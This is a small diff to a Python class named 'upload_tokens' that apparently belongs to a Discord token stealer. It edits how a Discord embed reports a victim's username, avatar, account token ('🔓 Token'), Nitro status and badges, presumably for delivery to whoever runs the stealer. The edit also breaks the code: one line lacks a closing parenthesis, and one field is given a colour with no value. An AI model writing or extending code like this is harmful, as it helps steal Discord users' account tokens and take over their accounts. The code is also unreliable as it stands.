@@ -339,9 +339,10 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username}", color=0x24262A)
+            embed = Embed(title=f"Username", color=0x24262A
             embed.set_thumbnail(url=avatar)
-
+            
+            embed.add_field(name=f"{username}", color=0x24262A, inline=False)
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
             embed.add_field(name="🛒 Nitro", value=f"```{nitro}```", inline=True),
             embed.add_field(name="🪪 Badges", value=f"```{'---'}```", inline=True)
